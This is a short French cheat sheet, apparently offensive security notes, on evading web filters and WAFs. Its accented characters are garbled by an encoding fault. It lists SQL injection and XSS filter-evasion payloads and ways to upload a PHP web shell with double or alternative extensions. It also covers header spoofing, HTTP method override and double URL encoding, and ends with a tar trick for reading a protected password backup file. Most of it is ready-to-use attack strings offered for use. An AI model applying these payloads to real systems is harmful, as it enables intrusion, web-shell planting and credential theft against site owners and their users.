# Bypass de filtrage & protections (WAF, extensions, etc.)

Lorsque des filtres empÃªchent tes attaques classiques, tu peux les contourner avec crÃ©ativitÃ©.

---

ğŸ”¹ Bypass SQLi
- Payload classique bloquÃ© : ' OR 1=1 --
- Payload obfusquÃ© : '/**/OR/**/1=1--
- EncodÃ© en URL : %27%20OR%201=1--%20

---

ğŸ”¹ Bypass XSS
- Filtre <script> ? â†’ <scr<script>ipt>
- Utiliser des balises alternatives : <img src=x onerror=alert(1)>
- Encodage HTML : &lt;script&gt;alert(1)&lt;/script&gt;

---

ğŸ”¹ Bypass extension / Upload
- Fichiers autorisÃ©s : .jpg â†’ renommer shell.php.jpg
- Double extension : shell.php;.jpg
- Extensions alternatives : .phtml, .phar, .php5

---

ğŸ”¹ Bypass par headers
- User-Agent : simuler un bot, ou contourner des restrictions IP
- X-Forwarded-For : utile si lâ€™IP est filtrÃ©e
- Referer : peut dÃ©clencher des fonctions diffÃ©rentes

---

ğŸ”¹ MÃ©thodes HTTP alternatives
- HEAD, PUT, TRACE : parfois autorisÃ©es
- X-HTTP-Method-Override: DELETE (dans une requÃªte POST)

---

ğŸ”¹ Techniques diverses
- Injections en base64
- Double URL encoding : %2527 (pour %27 â†’ ')
- Payload dans un cookie ou un User-Agent

---

ğŸ”¹ Bypass via archivage (tar)
- Si tu nâ€™as pas les droits de lecture sur un fichier, mais que tu peux le manipuler indirectement (via un dossier ou une tÃ¢che), tu peux tenter de lâ€™archiver.
- Exemple :
    ./tar -cvf archive.tar /var/backups/.old_pass.bak
    ./tar -xvf archive.tar
- Cela permet dâ€™accÃ©der au contenu si les droits sur le dossier parent permettent la lecture du inode mÃªme sans lecture directe du fichier.
